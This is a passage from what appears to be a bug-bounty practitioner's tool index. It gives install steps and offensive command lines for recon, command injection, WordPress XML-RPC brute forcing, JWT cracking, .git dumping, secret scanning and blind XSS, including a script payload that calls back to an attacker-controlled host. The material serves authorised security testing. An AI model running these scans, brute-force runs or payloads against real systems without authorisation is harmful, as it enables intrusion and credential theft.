jaeles scan -c 50 -s 'sensitive' -U live.txt -L 2          # level-2 sigs, 50 threads
jaeles scan -G -s 'passive' -U live.txt                    # passive detection only
echo target.com | jaeles scan -s 'common' --ba             # use BaseURL shortcut

# ===== commix (command injection automation) =====
commix -u "https://target.com/page?id=1" --batch
commix -u "https://target.com/api" --data='{"cmd":"INJECT"}' \
  --headers='Authorization: Bearer TOKEN' --random-agent
commix -r request.txt --all                                # from raw HTTP request file

# ===== gotestwaf (measure WAF bypass rate) =====
gotestwaf --url https://target.com --verbose               # standard test
gotestwaf --url https://target.com --checkPoint "API"      # API-focused
```

---

## Phase 9 -- Full Recon Automation

| Tool | Purpose | Installation | Recommendation |
|------|---------|-------------|----------------|
| **BBOT** | Event-driven recursive recon (100+ built-in modules) | `pipx install bbot` | Personal top pick |
| **reconFTW** | Bash orchestrator (chains 50+ external tools) | `git clone github.com/six2dez/reconftw && ./install.sh` | Solid alternative |
| Osmedeus | Go orchestrator (cloud distributed, team use) | `curl -sSL osmedeus.org/install.sh \| bash` (install.sh broken; use release binary v5.0.2) | VPS primary orchestrator |

```bash
# ===== BBOT (recommended) =====
bbot -t target.com -p subdomain-enum -rf passive   # passive subdomain (run first, no noise)
bbot -t target.com -p subdomain-enum               # full including DNS brute
bbot -t target.com -p web-basic                    # web quick scan
bbot -t target.com -p web-thorough                 # web deep scan
bbot -t target.com -p spider                       # recursive crawler + JS analysis
bbot -t target.com -p nuclei                       # nuclei vulnerability scan
bbot -t target.com -p kitchen-sink --allow-deadly  # all modules
bbot --list-presets                                # list all presets

# ===== reconFTW (alternative) =====
./reconftw.sh -d target.com -r          # full recon (all modules)
./reconftw.sh -d target.com -p          # passive only (no active scanning)
./reconftw.sh -d target.com -s          # subdomain module only
./reconftw.sh -d target.com -w          # web analysis only
./reconftw.sh -l domains.txt -r         # multi-target

# ===== Osmedeus (for distributed multi-machine setups) =====
osmedeus run -f general -t target.com
osmedeus cloud run -f general -t target.com --instances 3
```

> Detailed comparison and operational flow -> [[Playbook - BBOT vs Osmedeus Recon Flow]]

---

## Modernization additions (2026-06-03 SOTA refresh)

See individual Tool notes (in `05 - Tools/`):

| Tool | Stage | Replaces / Complements | Source |
|------|-------|------------------------|--------|
| [[Tool - Caido]] | intercept-proxy | Burp alternative (Rust, lightweight) | https://caido.io |
| [[Tool - x8]] | param-discovery | paramspider / Arjun (faster + baseline diff) | https://github.com/Sh1Yo/x8 |
| [[Tool - feroxbuster]] | content-discovery | ffuf (recursive dir scan, Rust) | https://github.com/epi052/feroxbuster |
| [[Tool - xnLinkFinder]] | js-analysis | LinkFinder original's active fork (Burp/wayback support) | https://github.com/xnl-h4ck3r/xnLinkFinder |
| [[Tool - SecretFinder]] | js-analysis | trufflehog (specialized for JS / live web) | https://github.com/m4ll0k/SecretFinder |
| [[Tool - kxss]] | xss-recon | Pre-filter before nuclei XSS (finds reflection signal) | https://github.com/Emoe/kxss |

Linked to [[Checklist - Recon Floor]] section 1 minimum tool list.

---

## Specialized -- Authentication & WordPress

| Tool | Purpose | Installation |
|------|---------|-------------|
| wpscan | WordPress vulnerability scanner (CVE + user enumeration) | `gem install wpscan` |
| XMLRPC-Bruteforce | WordPress multicall batch brute-force | `git clone github.com/henriqqw/XMLRPC-Bruteforce` |
| hashcat | Password hash cracking | `brew install hashcat` |
| jwt-tool | JWT attacks (none alg / key confusion) | `pip install jwt-tool` |

```bash
wpscan --url https://target.com --api-token TOKEN --enumerate u,vp,vt
wpscan --url https://target.com -U admin -P rockyou.txt   # not recommended for direct use

# XMLRPC batch brute-force (only when brute force is in scope)
python3 xmlrpc_bruteforce.py https://target.com/xmlrpc.php -u admin -w rockyou.txt \
  -b 100 --stop-on-success -o found.txt

# JWT attacks
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
python3 jwt_tool.py TOKEN -X a                             # none algorithm
```

---

## Secret Scanning

| Tool | Purpose | Installation |
|------|---------|-------------|
| **trufflehog** | Scan git repo / filesystem / S3 / docker / GitHub org for leaked secrets (700+ detectors + verification) | `curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh \| sh -s -- -b ~/.local/bin` |
| kingfisher | ProjectDiscovery secret scanner (built into Osmedeus) | Installed with Osmedeus |

```bash
# Scan GitHub repo (including commit history)
trufflehog git https://github.com/target/repo --only-verified

# Scan entire GitHub org
trufflehog github --org target-org --only-verified

# Scan local filesystem (after APK unpacking, .git restore)
trufflehog filesystem ./extracted/ --only-verified

# Scan S3 bucket (if read access exists)
trufflehog s3 --bucket target-assets

# Docker image
trufflehog docker --image redis:latest

# Integrated with bbflow-vps
bbflow secrets https://github.com/trufflesecurity/test_keys   # test run -> AWS AKIA2UC3BSXMLSCLTUUS detected
```

**Tested example**: Running `trufflehog git` against `trufflesecurity/test_keys` immediately detects AWS canary token + URI credentials, confirming the tool works.

---

## Google Dorking / OSINT

| Tool | Purpose | Installation |
|------|---------|-------------|
| **pagodo** | Automated Passive Google Dork with jitter / rate-limit / retry | `git clone github.com/opsdisk/pagodo && pip install -r requirements.txt` |
| **GooFuzz** | v2.0 -- bash-based Google-dork path fuzzer (needs CSE API key for full volume) | `git clone github.com/m3n0sd0n4ld/GooFuzz` |
| **GDorks** | Ishanoshada's categorized dork lists (CCTV / doc / finance / medical etc.) | `git clone github.com/Ishanoshada/GDorks` |
| **google-dork-wordlists** | 2 million dork merged list (1-million-dorks.txt + all-dorks-merged.txt) | `git clone github.com/mccleod1290/google-dork-wordlists` |

```bash
# pagodo -- passive scan against a target domain
pagodo -g ~/bbtools/google-dork-wordlists/1-million-dorks.txt \
  -d target.com \
  -s urls.txt \
  -o results.json \
  -i 37 -x 60  # 37-60s jitter between queries

# GooFuzz -- needs Google CSE key file with CX_ID,API_KEY pairs
goofuzz -t target.com -w ~/bbtools/google-dork-wordlists/cctv.txt -k ~/goofuzz-keys.txt

# Integrated with bbflow-vps
bbflow dork target.com                                  # default uses 1-million-dorks
DORKS_FILE=/path/to/custom.txt bbflow dork target.com   # custom dork set
```

**Rate-limit warning**: Unauthenticated Google search gets CAPTCHA banned after ~40 queries/hour. pagodo defaults to 37-60 second jitter; pair with a proxy pool or Google CSE API key for high-volume runs.

---

## Source Code -- .git Exposure

| Tool | Purpose | Installation |
|------|---------|-------------|
| git-dumper | Restore .git (first choice, includes commit history) | `pip install git-dumper` |
| GitHack | .git restoration (stable, no history) | `git clone github.com/lijiejie/GitHack` |
| GitTools | Three-in-one (Dumper/Extractor/Finder) | `git clone github.com/internetwache/GitTools` |

```bash
# Standard three-tool pipeline
git-dumper https://target.com/.git/ ./git_output/
python3 GitHack.py https://target.com/.git/ ./githack_output/
bash gittools/Dumper/gitdumper.sh https://target.com/.git/ ./gittools_output/

# Post-restore mandatory checks
cd ./git_output && git log --oneline
git log -p --all | grep -i "password\|secret\|api_key\|token"
git config --get remote.origin.url
git diff HEAD~1 HEAD
```

---

## Mobile & Firmware Analysis

| Tool | Purpose | Installation |
|------|---------|-------------|
| jadx | APK decompilation (Java source) | `brew install jadx` |
| apktool | APK unpacking (smali level) | `brew install apktool` |
| binwalk | Firmware unpacking + filesystem extraction | `brew install binwalk` |
| Ghidra | Binary reverse engineering | `brew install ghidra` |
| objdump | Disassembly (Linux binaries) | Built-in |
| strings | String extraction (find credentials/format strings) | Built-in |
| frida | Dynamic injection / runtime hooking | `pip install frida-tools` |

```bash
# APK analysis
jadx -d ./decompiled/ target.apk
grep -rE "(password|secret|api_key|hardcoded)" ./decompiled/ -i

# Firmware analysis
binwalk -Me firmware.bin                                   # unpack
strings -t x firmware.bin | grep -i "password\|admin"     # string search
objdump -d binary | grep -A10 "system\|popen"             # disassembly

# Ghidra (CLI headless)
analyzeHeadless /tmp/ghidra_project myProj -import binary -postScript PrintTree.java
```

---

## OSINT & Reconnaissance

| Tool | Purpose | Installation |
|------|---------|-------------|
| theHarvester | Email / subdomain / employee OSINT | `pip install theHarvester` |
| shodan | Exposed device search engine | `pip install shodan` |
| cewl | Crawl website to generate custom wordlist | `gem install cewl` |
| exiftool | Document metadata extraction | `brew install exiftool` |
| jivoi/pentest | Pentest methodology cheat sheet | [Gist](https://gist.github.com/jivoi/724e4b4b22501b77ef133edc63eba7b4) |

```bash
theHarvester -d target.com -b google,linkedin,shodan -l 500 -f output
shodan search "org:target.com" --fields ip_str,port,hostnames
cewl https://target.com -d 3 -m 5 -w custom_wordlist.txt
exiftool -all target.pdf target.docx
```

---

## Cloud Storage Enumeration

| Tool | Purpose | Installation |
|------|---------|-------------|
| **s3scanner** | AWS S3 bucket existence/ACL/region detection (Go, fast) | `go install github.com/sa7mon/s3scanner@latest` |

```bash
# Single bucket check
s3scanner -bucket flaws.cloud                              # -> exists / us-west-2 / AllUsers: [READ]
# Batch scan (generate bucket names from common patterns)
for s in assets backup media uploads logs dev staging; do echo "target-$s"; done | s3scanner -bucket -

# Test: flaws.cloud returns `AllUsers: [READ]` indicating anonymous read -> list bucket content
```

---

## Blind XSS Platforms

| Tool | Purpose | Installation |
|------|---------|-------------|
| **ezXSS** | Self-hosted Blind XSS payload delivery + callback dashboard (PHP) | `git clone github.com/ssl/ezXSS`; Docker or Apache+PHP |
| xss.report / hahwul.xss.ht | Publicly hosted alternatives | Register for an account |

```bash
# ezXSS self-hosted (own domain required for callbacks, avoids shared service collisions)
cd ~/bbtools/ezXSS
docker-compose up -d
# Browse https://your-domain.com:8001 -> register admin -> get payload URL
# payload: <script src="https://your-domain.com/YOUR_ID"></script>

# Combined with dalfox
dalfox url https://target.com/search?q=test -b 'https://your-domain.com/YOUR_ID'
cat xss_candidates.txt | dalfox pipe -b 'https://your-domain.com/YOUR_ID'
```

---

## AI-Assisted Hunting

| Tool | Purpose | Notes |
|------|---------|-------|
| Claude Bug Bounty Harness | 13 commands, 7 agents, Burp/H1 MCP | See [[Tool - Claude Bug Bounty Harness]] |
| nuclei -ai | LLM-assisted template generation | nuclei v3.2+; external API/quota/privacy, not default; output quarantine-first |
| Playbook - Nuclei + LLM Agents | CAI/PentAGI/HexStrike tool comparison | See [[Playbook - Nuclei + LLM Agents]] |

---

## Proxy & Traffic Analysis

| Tool | Purpose | Installation |
|------|---------|-------------|
| Burp Suite | HTTP proxy + Scanner + Intruder | `brew install --cask burp-suite` |
| mitmproxy | CLI HTTP proxy (API intercept) | `pip install mitmproxy` |
| Caido | Modern Burp alternative (Web UI) | `brew install caido` |

---

## Reference Repositories

| Repo | Purpose | When to use |
|------|---------|-------------|
| [OWASP/wstg](https://github.com/OWASP/wstg) | Web Security Testing Guide (~400 test cases, official OWASP documentation) | Cross-reference vulnerability classification and description when writing reports; align CVSS scoring |
| [hahwul/WebHackersWeapons](https://github.com/hahwul/WebHackersWeapons) | 160+ tools curated list, organized by attack surface | Quick lookup when finding new tools or alternatives; README may reveal unknown weapons |
| [EdOverflow/can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) | 40+ SaaS vendor subdomain takeover status official classification | When discovering dangling CNAMEs, check here first to confirm whether it's truly vulnerable |
| [lutfumertceylan/top25-parameter](https://github.com/lutfumertceylan/top25-parameter) | Top 25 parameter names for each vulnerability type | Use with x8/arjun/ffuf for targeted parameter fuzzing |

---

## VPS Full-Suite Deployment (Oracle Cloud / Personal VPS)

**Tested 2026-04-22**: Oracle Cloud Ubuntu 24.04 + 11 GB RAM + 45 GB disk, full Osmedeus + 14 tool deployment in approximately 15 minutes.

```bash
# ====== 1. Osmedeus v5.0.2 (pre-built binary, official install.sh is broken) ======
wget https://github.com/j3ssie/osmedeus/releases/download/v5.0.2/osmedeus_5.0.2_linux_amd64.tar.gz
tar -xzf osmedeus_5.0.2_linux_amd64.tar.gz
sudo install -m 755 osmedeus/osmedeus /usr/local/bin/osmedeus
osmedeus health             # first run auto-downloads 24 binaries to ~/osmedeus-base/external-binaries
osmedeus workflow           # lists 11 flows + 25 modules (domain-lite / domain-standard / domain-extensive / fast / general / url / sast / cidr)

# ====== 2. System Go + Rust (Osmedeus-bundled Go won't export to PATH) ======
sudo apt install -y golang-go build-essential python3-pip python3-venv jq ripgrep tmux
curl -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain stable --profile minimal

# ====== 3. Go tools batch install ======
go install github.com/hahwul/dalfox/v2@latest
go install github.com/hakluke/hakrawler@latest
go install github.com/jaeles-project/jaeles@latest
go install github.com/sa7mon/s3scanner@latest
go install github.com/haccer/subjack@latest
go install github.com/wallarm/gotestwaf/cmd/gotestwaf@latest

# ====== 4. Rust tool ======
cargo install x8

# ====== 5. Python tools ======
pip install --user --break-system-packages uro
git clone --depth 1 https://github.com/devanshbatham/ParamSpider ~/bbtools/ParamSpider
cd ~/bbtools/ParamSpider && pip install --user --break-system-packages .

# ====== 6. Git-cloned tools ======
mkdir -p ~/bbtools && cd ~/bbtools
for r in commixproject/commix EdOverflow/can-i-take-over-xyz OWASP/wstg \
         hahwul/WebHackersWeapons ssl/ezXSS lutfumertceylan/top25-parameter; do
  git clone --depth 1 "https://github.com/$r"
done

# ====== 7. Command wrapper (make Python tools usable as binaries) ======
sudo tee /usr/local/bin/commix > /dev/null <<EOF
#!/bin/bash
exec python3 /home/\$USER/bbtools/commix/commix.py "\$@"
EOF
sudo chmod +x /usr/local/bin/commix

# ====== 8. System-level PATH fix (critical! bashrc is not sourced in non-interactive SSH) ======
sudo tee /etc/profile.d/bbtools.sh > /dev/null <<'EOF'
export PATH="$PATH:$HOME/go/bin:$HOME/.cargo/bin:$HOME/.local/bin"
EOF
sudo chmod +x /etc/profile.d/bbtools.sh

# ====== 9. Verify (test with login shell, not interactive) ======
ssh -i ~/.ssh/key ubuntu@vps -t 'bash -l -c "for t in osmedeus dalfox hakrawler jaeles s3scanner subjack x8 paramspider commix uro; do echo \"\$t: \$(command -v \$t)\"; done"'
```

**Key pitfalls:**
- Osmedeus official `install.sh` URL is broken (v5+); must use the release binary.
- `bashrc` exports do not take effect in non-interactive SSH commands; must write to `/etc/profile.d/*.sh` or use `bash -l`.
- Some Python tools (ParamSpider / commix) are not pip packages; they need local `pip install .` or shell wrappers.

**Typical Osmedeus VPS workflows:**
```bash
# Lightweight passive recon (no rate limit triggers)
osmedeus run -f domain-lite -t target.com --timeout 30m

# Standard recon (includes DNS brute + HTTP fingerprint, ~30 minutes)
osmedeus run -f domain-standard -t target.com --timeout 2h

# Full recon (includes nuclei + content fuzz, ~2-3 hours)
osmedeus run -f general -t target.com --timeout 4h

# Results in ~/workspaces-osmedeus/target.com/
# Key directories: subdomain/ probing/ fingerprint/ vuln/
```

**Pull results to local machine:**
```bash
scp -i ~/.ssh/key -r ubuntu@vps:~/workspaces-osmedeus/target.com \
    ./workshop/target/osmedeus/
```

**Sample output scale (domain-lite ~2 minutes):**
| Directory | Content | Example |
|-----------|---------|---------|
| `subdomain/` | merged subdomain list | 187 subs |
| `probing/` | DNS + HTTP probe results | 508 DNS / 164 live HTTP |
| `fingerprint/` | HTTP tech stack + filtered "interesting" | 90 interesting hosts (includes filtered.md) |
| `ipspace/` | IP/ASN mapping | 54 IPs |

---

## Batch Install Script

```bash
# Go tools batch install
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/projectdiscovery/asnmap/cmd/asnmap@latest
go install github.com/tomnomnom/anew@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/tomnomnom/gf@latest
go install github.com/tomnomnom/assetfinder@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install github.com/hakluke/hakrawler@latest
go install github.com/ffuf/ffuf/v2@latest
go install github.com/hahwul/dalfox/v2@latest
go install github.com/d3mondev/puredns/v2@latest
go install github.com/MuhammadWaseem29/BackupFinder/cmd/backupfinder@v1.0.2

# Python tools
pip install arjun paramspider dirsearch sqlmap jwt-tool theHarvester frida-tools
pipx install bbot                        # BBOT isolated install via pipx
pip install git-dumper

# brew
brew install nmap masscan sqlmap hashcat jadx apktool binwalk exiftool findomain
brew install --cask ghidra burp-suite

# npm
npm install -g reverse-sourcemap @sugarat/source-map-cli
```

---

## The Boundaries of Toolchains

**Tools can only find what they were designed to find.**

Real vulnerabilities are often in places tools cannot scan:

| What tools CAN do | What tools CANNOT do |
|-------------------|---------------------|
| List all subdomains | Determine which endpoint has a business logic flaw |
| Scan for misconfig patterns | Understand why a specific API should not be public |
| Find staging environments | Know the boundary differences between staging and production |
| Run CVE templates with nuclei | Understand the root cause behind a vulnerability |
| Crawl all endpoints from JS | Read source code to understand the authorization model |
| Automated fuzzing | Discover business logic bypass chains (A -> B -> C) |

**Tools are amplifiers, not replacements.** See [[Lessons Learned]] -- Lesson #12 (The Boundaries of Toolchains).

---

## Related Notes

- [[Skill - security-arsenal]] -- payload tables, bypass techniques, submission rules
- [[Playbook - Recon Methodology]] -- six-phase recon complete instructions
- [[Playbook - API Attack Surface]] -- REST/GraphQL/gRPC attack manual
- [[Tool - JS-Tap]] -- XSS escalation / credential harvesting
- [[Tool - Source Map Reverse Engineering]] -- .map reverse engineering workflow
- [[Tool - Claude Bug Bounty Harness]] -- AI Agent framework
- [[Pattern - Git Exposure]] -- .git three-tool pipeline

---

## Index: All Tools (cross-link to prevent knowledge-graph orphans)

> These tools are mentioned throughout the vault but lack a single index point. This section adds wikilink back-references.

### Reverse Engineering / Forensics
- **Ghidra** (reverse engineering) -- firmware / .NET / Electron asar analysis
- **GitTools / git-dumper / GitHack** -- `.git` exposure three-tool pipeline (see [[Pattern - Git Exposure]])
- **TruffleHog** -- Secret / Credential scanner
- **hashcat** -- Password cracking (including bcrypt / NTLMv2)
- **binwalk** -- Firmware unpacking
- **jadx** -- APK decompilation
- **ExcaliBrain** -- Obsidian visualization (vault internal structure analysis)

### Source Code Review
- **Semgrep** -- Static Analysis with Security Rule Sets
- **CodeQL** -- GitHub semantic search
- Workflow: [[wiki/84-source-code-review-flow|Source Code Review Flow]]

### LLM / AI Security
- **PromptMap** -- LLM Prompt Injection Scanner
- **Garak** -- NVIDIA LLM Vulnerability Scanner
- Integration: [[Pattern - AI LLM MCP Security]]

### API / GraphQL
- **grpcurl** -- gRPC client ([[Playbook - API Attack Surface]])
- **InQL** (Burp Extension) -- GraphQL introspection
- **Arjun** -- HTTP parameter discovery

### Burp Extensions
- **Autorize** -- IDOR/authz testing
- **SAML Raider** -- XSW Attack Suite
- **Burp Collaborator** -- OOB DNS/HTTP probe

### WordPress
- **wpscan** -- WordPress scanner

---

## Tools with Dedicated Notes (index updated 2026-06-04)

> `automation/check_tool_arsenal.py` detects tool note files in the vault that Arsenal Index does not mention.
> This section purely establishes back-references; **usage details are in each tool's own note, not duplicated here**.
> Running `python3 automation/check_tool_arsenal.py` should always return "in sync".

### Firmware / Reverse Engineering
- [[Tool - Ghidra]] -- disassembler / decompiler (SRE framework)
- [[Tool - binwalk]] -- firmware unpacking + entropy analysis
- [[Tool - jadx]] -- APK / DEX to Java source

### Recon / Discovery (with dedicated notes)
- [[Tool - subfinder]] -- passive subdomain enumeration (canonical)
- [[Tool - subzy]] -- subdomain takeover detector
- [[Tool - httpx]] -- live host + tech detect (canonical)
- [[Tool - nuclei]] -- CVE / exposure template scan (canonical)

### Git Exposure
- [[Tool - git-dumper]] -- `.git` exposed to repo restore (first choice)
- [[Tool - GitHack]] -- `.git` exposed to repo restore (backup)
- [[Tool - GitTools]] -- `.git` extraction + history analysis

### WordPress / CMS
- [[Tool - wpscan]] -- WordPress scanner (canonical detailed version)

### Password / Hash
- [[Tool - hashcat]] -- GPU-accelerated hash cracking

### LLM / AI / MCP
- [[Tool - Proxy MCP for LLM Pentesting]] -- MCP proxy, LLM traffic interception / modification / replay
- [[Tool - NVIDIA MiniMax AI]] -- Large open-source LLM evaluation, local inference
- [[Tool - Claude Code Agents]] -- Claude Code agent orchestration reference

### Cloud / K8s
- [[Tool - Cloud and DNS Recon Toolkit]] -- cloud IAM / Entra / DNS recon tool selection map
- [[Tool - k8scout]] -- K8s exposure / RBAC / misconfig scan

### Meta / Framework
- [[Tool - VPS Framework]] -- Oracle VPS deployment / Docker compose standard
- [[Tool - Testing Matrix]] -- test coverage matrix template
- [[Tool - vuln_scanner]] -- internal vulnerability scanner runtime

### Anti-Fraud OSINT (2026-06-26)

> See [[Tool - Anti-Fraud OSINT Toolchain]] for details. The table below is a quick reference; **empirical conclusion: for new sites <=30 days + Cloudflare, most passive DNS tools return zero hits; the most effective tools are WHOIS + curl JS analysis**.

| Tool | Purpose | New Site Effectiveness | Notes |
|------|---------|----------------------|-------|
| `whois` | Registry Domain ID + Registrar account | Works immediately | Essential for bulk suspension |
| `curl` JS analysis | config.js LINE/Telegram/bank IOC | Works immediately | Highest IOC yield |
| **crt.sh** | CT Log subdomain + batch SAN analysis | May be empty for new sites | `crt.sh/?q=%.domain&output=json` |
| **AlienVault OTX** | Domain/IP pulse count | 0 for new sites | Free; check again after reports accumulate |
| **URLScan.io** | Screenshot timeline + network requests | 0 for new sites | Free; `/api/v1/search/?q=page.domain:X` |
| **SecurityTrails** | Passive DNS historical A records | Nothing behind CF | Paid; 50 queries/month free |
| **abuse.ch URLhaus** | URL blacklist | 0 for new sites | Requires free API key |
| **ThreatFox** | IOC DB (domain/IP/hash) | 0 for new sites | Requires free API key |
| **ViewDNS** | IP History | Nothing behind CF | `viewdns.info/iphistory/?domain=X` |
| **DomainBigData** | Same registrant domains | Anti-scraping | Manual browsing preferred |
| **bgp.he.net** | ASN routing + same-IP domains | Nothing behind CF | Effective only with origin IP |
| **gau** | Historical URL aggregation | Empty for new sites | Check again for older sites |
| **Shodan** | Same-ASN host services | Nothing behind CF | `asn:AS45102` for cluster search |
| **PhishTank** | Community phishing URL verification | 0 for new sites | Requires API key (free) |
| **Censys** | TLS cert + host services | Requires auth | Free account |

### Migrated to 05 - Tools/ (SOTA refresh)
- [[Tool - Caido]] / [[Tool - x8]] / [[Tool - feroxbuster]] / [[Tool - kxss]] / [[Tool - xnLinkFinder]] / [[Tool - SecretFinder]]
- [[Tool - Source Map Reverse Engineering]] / [[Tool - JS-Tap]] / [[Tool - Recox]]
